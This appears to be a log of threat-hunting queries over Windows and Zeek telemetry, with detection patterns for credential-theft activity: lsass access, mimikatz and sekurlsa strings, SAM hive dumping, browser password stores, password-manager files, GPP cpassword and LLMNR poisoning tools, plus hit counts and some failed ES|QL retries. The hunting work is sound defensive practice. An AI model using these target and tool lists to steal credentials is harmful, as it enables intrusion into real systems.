| q-718069db97 | check C163 | search | {"dataset": "windows.other", "query": "event.code:1 OR event.code:11", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.… | 7 |  |
| q-2ea461c896 | check C164 | search | {"dataset": "zeek", "query": "event.action:smb_files", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinatio… | 12 |  |
| q-4b2e760068 | check C165 | aggregate | {"dataset": "windows.sysmon", "field": "registry.path", "query": "event.code:13 AND (registry.path:*SAM* OR registry.path:*SECURITY* OR registry.path:*LSA* OR registry.path:*Credentials* OR registry.path:*Vault*)", "time_from": null, "time_to": null, "size": 5… | 7 |  |
| q-ee5474e766 | check C166 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*reg\\ query* OR process.command_line:*reg\\ save* OR process.command_line:*reg\\ export*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name… | 0 |  |
| q-38724da208 | check C167 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*reg\\ query* OR win.ScriptBlockText:*HKLM*SAM* OR win.ScriptBlockText:*Get-ItemProperty*HKLM*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "ob… | 1 |  |
| q-5c60eed113 | check C168 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*SAM* OR win.ObjectName:*SECURITY* OR win.ObjectName:*Credentials*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-1d6f3910c8 | check C169 | search | {"dataset": "windows.other", "query": "win.HiveName:* OR win.KeyName:*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sourc… | 5 |  |
| q-0ec2d1ba93 | check C170 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*ConsoleHost_history* OR win.ScriptBlockText:*PSReadLine* OR win.ScriptBlockText:*history*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observ… | 0 |  |
| q-136997be37 | check C171 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*ConsoleHost_history* OR process.command_line:*PSReadLine* OR process.command_line:*history.txt*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observ… | 0 |  |
| q-a736e5a0ab | check C172 | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND (file.path:*ConsoleHost_history* OR file.path:*PSReadLine*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-6498579d75 | check C173 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*ConsoleHost_history* OR win.ObjectName:*PSReadLine*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-07f18ee558 | check C174 | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND (file.path:*.key OR file.path:*.pem OR file.path:*.pfx OR file.path:*.p12 OR file.path:*.ppk OR file.path:*.pgp OR file.path:*.cer OR file.path:*.p7b OR file.path:*.asc)", "time_fr… | 1 |  |
| q-9a394ad267 | check C175 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*.pem OR process.command_line:*.pfx OR process.command_line:*.p12 OR process.command_line:*.key OR process.command_line:*.ppk)", "time_from": null, "time_to": null, "fields": ["@tim… | 0 |  |
| q-bb87d38e66 | check C176 | aggregate | {"dataset": "windows.security", "field": "win.RelativeTargetName", "query": "event.code:5145 AND (win.RelativeTargetName:*.key OR win.RelativeTargetName:*.pem OR win.RelativeTargetName:*.pfx OR win.RelativeTargetName:*.p12 OR win.RelativeTargetName:*.ppk)", "t… | 0 |  |
| q-8d41c1941b | check C177 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*.pem OR win.ScriptBlockText:*.pfx OR win.ScriptBlockText:*.p12 OR win.ScriptBlockText:*.ppk OR win.ScriptBlockText:*.key)", "time_from": null, "time_to": null, "fields": ["@t… | 0 |  |
| q-cba27cf3ef | check C178 | search | {"dataset": "windows.other", "query": "win.FileName:* OR win.ImagePath:*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sou… | 5 |  |
| q-bcba57ce6c | check C179 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Groups.xml* OR win.ScriptBlockText:*gpprefdecrypt* OR win.ScriptBlockText:*cpassword* OR win.ScriptBlockText:*SYSVOL*)", "time_from": null, "time_to": null, "fields": ["@time… | 0 |  |
| q-f51b3e6063 | check C180 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*Groups.xml* OR process.command_line:*cpassword* OR process.command_line:*SYSVOL* OR process.command_line:*gpprefdecrypt*)", "time_from": null, "time_to": null, "fields": ["@timesta… | 0 |  |
| q-fce34f9029 | check C181 | aggregate | {"dataset": "windows.security", "field": "win.RelativeTargetName", "query": "event.code:5145 AND (win.RelativeTargetName:*Groups.xml* OR win.RelativeTargetName:*SYSVOL* OR win.RelativeTargetName:*Policies*)", "time_from": null, "time_to": null, "size": 50, "su… | 38 |  |
| q-bac0518a59 | check C182 | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND (file.path:*Groups.xml* OR file.path:*SYSVOL*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-4eadf693b5 | check C183 | search | {"dataset": "windows.other", "query": "win.Message:*SYSVOL* OR win.Message:*Groups.xml*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.comm… | 0 |  |
| q-0598ba4890 | check C184 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10 AND (win.TargetImage:*lsass* OR win.TargetImage:*winlogon* OR win.TargetImage:*Credential* OR win.TargetImage:*Vault*)", "time_from": null, "time_to": null, "size": 50, "sub_fiel… | 470 |  |
| q-ff63987120 | check C185 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-0d653191bd | check C186 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*procdump* OR process.command_line:*mimikatz* OR process.command_line:*sekurlsa* OR process.command_line:*lsass* OR process.command_line:*comsvcs*MiniDump*)", "time_from": null, "ti… | 1 |  |
| q-bfd8d3eaf3 | check C187 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*lsass* OR win.ObjectName:*Credential* OR win.ObjectName:*Vault* OR win.ObjectName:*SAM*)", "time_from": null, "time_to": null, "size": 50, "sub_field": nu… | 6 |  |
| q-f25d1d2ff4 | check C188 | aggregate | {"dataset": "windows.security", "field": "win.TargetProcessName", "query": "event.code:4656 AND (win.TargetProcessName:*lsass* OR win.TargetProcessName:*winlogon*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-3f8a3772a8 | check C189 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*MiniDump* OR win.ScriptBlockText:*sekurlsa* OR win.ScriptBlockText:*Credential*)", "time_from": null, "time_to": null, "fields": ["@timestamp",… | 3 |  |
| q-3d2e84a11b | check C190 | search | {"dataset": "windows.other", "query": "win.ServiceName:* OR win.ImagePath:*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "… | 5 |  |
| q-99b7c85e9e | check C191 | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND (file.path:*Login\\ Data* OR file.path:*logins.json* OR file.path:*key3.db* OR file.path:*key4.db* OR file.path:*signons.sqlite* OR file.path:*Cookies*)", "time_from": null, "time_… | 1 |  |
| q-882ad6a330 | check C192 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*Login\\ Data* OR process.command_line:*logins.json* OR process.command_line:*key3.db* OR process.command_line:*key4.db* OR process.command_line:*signons.sqlite*)", "time_from": nul… | 0 |  |
| q-ecb46fd55e | check C193 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*Login\\ Data* OR win.ObjectName:*logins.json* OR win.ObjectName:*key3.db* OR win.ObjectName:*key4.db*)", "time_from": null, "time_to": null, "size": 50, "… | 0 |  |
| q-93b546eba6 | check C194 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Login\\ Data* OR win.ScriptBlockText:*logins.json* OR win.ScriptBlockText:*key4.db* OR win.ScriptBlockText:*sqlite*)", "time_from": null, "time_to": null, "fields": ["@timest… | 0 |  |
| q-33a863d27b | check C195 | search | {"dataset": "windows.other", "query": "win.FileName:* OR win.Message:*Login*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 0 |  |
| q-0ac93e9f06 | check C196 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 | F27 |
| q-84f6454e85 | check C197 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-d7d43290d4 | check C198 | search | {"dataset": "windows.sysmon", "query": "event.code:15 AND win.TargetFilename:*Credential*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.co… | 0 |  |
| q-a5a94d27b0 | check C199 | search | {"dataset": "windows.security", "query": "event.code:4688 AND process.command_line:*vault*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.c… | 0 |  |
| q-eb35e9478d | check C200 | search | {"dataset": "windows.security", "query": "event.code:4688 AND process.command_line:*cmdkey*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.… | 0 |  |
| q-eebad45145 | check C201 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND win.ScriptBlockText:*Credential*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "pro… | 3 |  |
| q-bc842cfea3 | check C202 | search | {"dataset": "windows.other", "query": "event.code:7045 AND win.ImagePath:*vault*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 0 |  |
| q-17cfaf9425 | check C203 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.executable:*keepass* OR process.executable:*1password* OR process.executable:*bitwarden* OR process.executable:*lastpass*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "ho… | 0 |  |
| q-257dac9d73 | check C204 | search | {"dataset": "windows.security", "query": "event.code:4688 AND process.command_line:*kdbx*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.co… | 0 |  |
| q-cbd4535c22 | check C205 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*kdbx OR file.path:*1password* OR file.path:*bitwarden*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name… | 0 |  |
| q-f14d3e62ca | check C206 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND (win.TargetImage:*keepass* OR win.TargetImage:*1password* OR win.TargetImage:*bitwarden*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "e… | 0 |  |
| q-c83d8b1a1e | check C207 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*kdbx OR win.ScriptBlockText:*KeePass OR win.ScriptBlockText:*1Password)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.da… | 0 |  |
| q-723568606d | check C208 | search | {"dataset": "windows.other", "query": "event.code:7045 AND (win.ImagePath:*keepass* OR win.ImagePath:*1password* OR win.ImagePath:*bitwarden*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.… | 0 |  |
| q-d51d07a1a0 | check C209 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 | F30 |
| q-4ed723f053 | check C210 | aggregate | {"dataset": "windows.sysmon", "field": "win.SourceImage", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-36e35c7d05 | check C211 | search | {"dataset": "windows.sysmon", "query": "event.code:7 AND (win.ImageLoaded:*lsass* OR win.ImageLoaded:*cryptdll* OR win.ImageLoaded:*sam* OR win.ImageLoaded:*wdigest*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", … | 75 |  |
| q-5fed1027bd | check C212 | search | {"dataset": "windows.security", "query": "event.code:4657 AND (win.ObjectName:*lsass* OR win.ObjectName:*cryptdll* OR win.ObjectName:*wdigest* OR win.ObjectName:*SecurityProviders*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "o… | 0 |  |
| q-0cc1c95424 | check C213 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*lsass* OR process.command_line:*mimikatz* OR process.command_line:*procdump*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "eve… | 0 |  |
| q-264e1c8f5b | check C214 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*mimikatz* OR win.ScriptBlockText:*sekurlsa*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "even… | 0 |  |
| q-96e2b60da9 | check C215 | search | {"dataset": "windows.other", "query": "event.code:7045 AND (win.ImagePath:*lsass* OR win.ImagePath:*cryptdll*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.exe… | 0 |  |
| q-88d344ac7f | check C216 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-0f3f104fac | check C217 | search | {"dataset": "windows.sysmon", "query": "event.code:7 AND (win.ImageLoaded:*lsass* OR win.ImageLoaded:*cryptdll*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.e… | 33 |  |
| q-a81a612064 | check C218 | search | {"dataset": "windows.security", "query": "event.code:4624 AND win.LogonType:3 AND win.TargetUserName:*$", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable… | 198 |  |
| q-15223a5ff5 | check C219 | search | {"dataset": "windows.security", "query": "event.code:4648 AND win.TargetUserName:*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_l… | 15 |  |
| q-3e73ccc41a | check C220 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*cryptdll* OR win.ScriptBlockText:*skeleton*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "even… | 0 |  |
| q-e99ed839bc | check C221 | search | {"dataset": "windows.other", "query": "event.code:7045 AND (win.ImagePath:*lsass* OR win.ImagePath:*cryptdll*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.exe… | 0 |  |
| q-5848c760b8 | check C222 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*System32* AND (file.path:*.dll OR file.path:*password*))", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.nam… | 0 |  |
| q-610b5885e5 | check C223 | search | {"dataset": "windows.sysmon", "query": "event.code:7 AND (win.ImageLoaded:*lsass* OR win.ImageLoaded:*password*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.e… | 1 |  |
| q-b3f7a4fe39 | check C224 | search | {"dataset": "windows.security", "query": "event.code:4657 AND (win.ObjectName:*Notification Packages* OR win.ObjectName:*PasswordFilter* OR win.ObjectName:*lsa*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "even… | 0 |  |
| q-ab6813555e | check C225 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*Notification* OR process.command_line:*PasswordFilter*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.co… | 0 |  |
| q-8b3d1776a3 | check C226 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Notification Packages* OR win.ScriptBlockText:*PasswordFilter* OR win.ScriptBlockText:*lsa*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "obse… | 0 |  |
| q-3a056d740e | check C227 | search | {"dataset": "windows.other", "query": "event.code:7045 AND (win.ImagePath:*password* OR win.ImagePath:*filter*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.ex… | 0 |  |
| q-147317af2f | check C228 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*AllowReversiblePasswordEncryption* OR win.ScriptBlockText:*ReversibleEncryption* OR win.ScriptBlockText:*Set-ADUser*)", "time_from": null, "time_to": null, "fields": ["@times… | 1 |  |
| q-765ba22bbb | check C229 | search | {"dataset": "windows.powershell", "query": "event.code:4103 AND (win.Payload:*Reversible* OR win.Payload:*AllowReversible*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name",… | 0 |  |
| q-cd610bef93 | check C230 | search | {"dataset": "windows.security", "query": "event.code:4739 AND win.NewValue:*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 0 |  |
| q-c29776d953 | check C231 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*Reversible* OR process.command_line:*AllowReversiblePasswordEncryption*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset… | 0 |  |
| q-0e436f1f2b | check C232 | search | {"dataset": "windows.other", "query": "event.code:7045 AND (win.ImagePath:*Reversible* OR win.ImagePath:*password*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "proces… | 0 |  |
| q-5379c947a9 | check C233 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*set-aduser*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*set-adauthenticationpolicy*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*strongauthentication*\" OR TO_L… | ERROR |  |
| q-23a3b5a937 | check C233 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*set-aduser*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*set-adauthenticationpolicy*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*strongauthentication*\" OR TO_L… | ERROR |  |
| q-345c5c3b72 | check C234 | aggregate | {"dataset": "windows.security", "field": "event.code", "query": "event.code:4739", "time_from": null, "time_to": null, "size": 10, "sub_field": null} | 0 |  |
| q-9b9193f4ab | check C235 | search | {"dataset": "windows.other", "query": "event.code:4739 OR event.code:4738 OR event.code:5136", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 0 |  |
| q-e0152cfc00 | check C236 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*ADAuthenticationPolicy* OR process.command_line:*Set-ADUser* OR process.command_line:*dsacls*)", "time_from": null, "time_to": null, "size": 20, "sub… | 0 |  |
| q-0fd0adf55f | check C237 | aggregate | {"dataset": "windows.security", "field": "event.code", "query": "event.code:5136", "time_from": null, "time_to": null, "size": 10, "sub_field": null} | 0 |  |
| q-8664861442 | check C238 | esql | {"query": "FROM windows.security METADATA _id, _index \| WHERE event.code == \"5136\" \| KEEP @timestamp, host.name, win.ObjectType, win.ObjectValueName, win.SubjectUserName, _id, _index"} | ERROR |  |
| q-87e0176bc4 | check C238 (repaired) | esql | {"query": "FROM windows.security METADATA _id, _index \| WHERE event.code == \"5136\" \| KEEP @timestamp, host.name, win.ObjectType, win.ObjectValueName, win.SubjectUserName, _id, _index"} | ERROR |  |
| q-de9c79f906 | check C239 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7 AND (win.ImageLoaded:*AAD* OR win.ImageLoaded:*Azure* OR win.ImageLoaded:*CloudAP* OR win.ImageLoaded:*dsreg*)", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 49 |  |
| q-b61b63fd2b | check C240 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*azuread*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*aadconnect*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*connect-msolservice*\" OR TO_LOWER(win.ScriptBlock… | ERROR |  |
| q-7e908c54c6 | check C240 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*azuread*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*aadconnect*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*connect-msolservice*\" OR TO_LOWER(win.ScriptBlock… | ERROR |  |
| q-990c3c9633 | check C241 | search | {"dataset": "windows.other", "query": "event.code:5136 OR event.code:5137 OR event.code:5141", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 0 |  |
| q-d4931397fe | check C242 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetObject", "query": "event.code:11 AND (win.TargetFilename:*\\\\System32\\\\* OR win.TargetFilename:*NetworkProvider* OR win.TargetFilename:*.dll)", "time_from": null, "time_to": null, "size": 30, "sub_field": nu… | 453 |  |
| q-dd699cc443 | check C243 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetObject", "query": "event.code:13 AND (registry.path:*NetworkProvider* OR registry.path:*ControlSet*\\\\Services\\\\*\\\\NetworkProvider*)", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 0 |  |
| q-01ffff3c4b | check C244 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10 AND (win.TargetImage:*lsass* OR win.TargetImage:*winlogon*)", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 470 |  |
| q-9c3466809f | check C245 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7 AND (win.ImageLoaded:*NetworkProvider* OR win.ImageLoaded:*np*.dll)", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 140 |  |
| q-874c0463d1 | check C246 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4657 AND (win.ObjectName:*NetworkProvider* OR win.ObjectName:*Winlogon*)", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 0 |  |
| q-6c0224b2d8 | check C247 | search | {"dataset": "windows.other", "query": "event.code:4657 OR event.code:4656", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 0 |  |
| q-a2e6471f12 | check C248 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*networkprovider*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*winlogon*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*reg add*\" \| KEEP @timestamp, host.name, us… | ERROR |  |
| q-b7e79982f9 | check C248 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*networkprovider*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*winlogon*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*reg add*\" \| KEEP @timestamp, host.name, us… | ERROR |  |
| q-e9d8d08776 | check C249 | aggregate | {"dataset": "windows.security", "field": "event.code", "query": "event.code:4663 OR event.code:4670 OR event.code:4656", "time_from": null, "time_to": null, "size": 10, "sub_field": null} | 10977 |  |
| q-e0728d6c5f | check C250 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*\\\\SAM* OR win.ObjectName:*\\\\SECURITY* OR win.ObjectName:*\\\\SYSTEM*)", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 4484 |  |
| q-4816935e28 | check C251 | aggregate | {"dataset": "windows.sysmon", "field": "win.DestinationHostname", "query": "event.code:3", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 1229 |  |
| q-677c03bf5a | check C252 | aggregate | {"dataset": "windows.sysmon", "field": "dns.question.name", "query": "event.code:22", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 81 |  |
| q-bacf3fe023 | check C253 | search | {"dataset": "windows.other", "query": "event.code:4663 OR event.code:4670 OR event.code:4656", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 0 |  |
| q-aa025c2dd7 | check C254 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*arpspoof*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*responder*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*ettercap*\" OR TO_LOWER(win.ScriptBlockText) LIKE … | ERROR |  |
| q-dfd767a541 | check C254 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*arpspoof*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*responder*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*ettercap*\" OR TO_LOWER(win.ScriptBlockText) LIKE … | ERROR |  |
| q-0f1f7fb8b0 | check C255 | aggregate | {"dataset": "zeek", "field": "zeek.conn_state", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 613 |  |
| q-2489ddcfeb | check C256 | aggregate | {"dataset": "windows.security", "field": "event.code", "query": "event.code:4697", "time_from": null, "time_to": null, "size": 10, "sub_field": null} | 23 |  |
| q-1bf892b6b7 | check C257 | aggregate | {"dataset": "windows.security", "field": "win.ServiceName", "query": "event.code:4697", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 23 |  |
| q-7e9fd48507 | check C258 | aggregate | {"dataset": "windows.sysmon", "field": "win.DestinationHostname", "query": "event.code:3 AND (destination.port:445 OR destination.port:139)", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 66 |  |
| q-0fcfc276af | check C259 | aggregate | {"dataset": "windows.sysmon", "field": "dns.question.name", "query": "event.code:22", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 81 |  |
| q-5770ca1245 | check C260 | search | {"dataset": "windows.other", "query": "event.code:4697 OR event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 5 | F38 |
| q-e68fdef768 | check C261 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*responder*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*inveigh*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*llmnr*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*n… | ERROR |  |
| q-fab8111879 | check C261 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*responder*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*inveigh*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*llmnr*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*n… | ERROR |  |
| q-18ff8fb104 | check C262 | aggregate | {"dataset": "zeek", "field": "zeek.service", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 613 |  |
| q-f2893c7bb3 | check C263 | aggregate | {"dataset": "windows.sysmon", "field": "win.DestinationHostname", "query": "event.code:3", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 1229 |  |
